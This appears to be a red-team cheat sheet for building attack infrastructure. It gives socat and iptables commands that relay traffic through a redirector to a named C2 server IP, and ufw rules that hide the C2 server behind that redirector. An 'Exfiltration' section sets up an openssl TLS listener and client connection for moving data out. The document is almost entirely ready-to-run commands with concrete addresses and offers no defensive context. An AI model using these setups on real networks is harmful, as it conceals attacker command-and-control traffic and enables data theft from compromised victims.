### Socat

```
Redirector IP: 35.153.183.204
C2 IP: 54.166.109.171
Socat TCP4-LISTEN:8080,fork TCP4:54.166.109.171:8080

 socat tcp-listen:80,fork,reuseaddr,forever tcp-connect:13.251.60.115:80
 socat tcp-listen:5353,fork,reuseaddr,forever udp-connect:localhost:53
```


### Iptable

```
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <Team-IP-ADDRESS>:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1

```

```
### On the C2 Server
sudo ufw allow 22
sudo ufw allow 55553
sudo ufw allow from 35.153.183.204 to any port 8080 proto tcp
sudo ufw allow out to 35.153.183.204 port 8080 proto tcp
sudo ufw deny out to any

###On The Redirector
sudo ufw allow 22
sudo ufw allow 8080
```

### Dumb pipe redirection
```
Socat TCP4-LISTEN:8080,fork TCP4:54.166.109.171:8080

iptables -I INPUT -p tcp -m tcp --dport 8080 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 54.166.109.171:8080
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1

```

### Exfiltration

```
On Server Side
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 8080
On a client, input the following:

openssl s_client -quiet -connect <IP>:<port>
```
